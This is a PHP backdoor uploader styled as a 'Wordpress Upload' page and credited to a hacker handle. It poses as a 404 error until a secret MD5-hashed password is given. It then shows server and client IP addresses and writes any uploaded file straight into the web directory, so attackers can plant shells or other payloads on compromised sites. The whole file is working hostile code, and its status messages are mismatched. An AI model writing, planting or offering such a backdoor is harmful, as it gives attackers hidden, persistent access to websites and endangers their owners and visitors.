<?php
//error_reporting(0);
http_response_code(404);
if (isset($_GET["p"])) {
    $p = $_GET["p"];
	$p_m = md5($p);
	if($p_m != 'bc7df2c662de81b0273bb3afcf250127'){
	    return http_response_code(404);
	}
} else {
	return http_response_code(404);
}

function a($msg, $sts = 1, $loc = "") {
	global $p;
	$status = (($sts == 1) ? "success" : "error");
	echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".$p."\"}})</script>";
}
?>
<!doctype html>
<!-- RandsX aka T1kus_g0t -->
<html lang="en">
<head>
	<meta name="theme-color" content="red">
	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<title>Wordpress Upload</title>
	<style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style>
	<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body style="background-color:#000;color:#fff;font-family:serif;">
	<div class="bg-dark table-responsive text-light border">
		<div class="d-flex justify-content-between p-1">
			<div><h3 class="mt-2"><a href="?">Wordpress Upload</a></h3></div>
			
		</div>
		<div class="border-top table-responsive">
			<li>Server : <?= "{$_SERVER["SERVER_NAME"]} ({$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]})" ?></li>
		</div>
		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
		
	</div>
<?php
if ($_FILES["f"]["error"][0] > 0)
{
    echo "error：" . $_FILES["f"]["error"][0] . "<br>";
}

if (isset($_FILES["f"]['name'][0])) {
	move_uploaded_file($_FILES["f"]["tmp_name"][0], __DIR__.'/' . $_FILES["f"]["name"][0]);

    if (file_exists(__DIR__.'/' . $_FILES["file"]["name"][0])) {
		a("folder deleted successfully");
	} else {
		a("failed to delete the folder", 0);
	}
}


?>
	
</body>
</html>
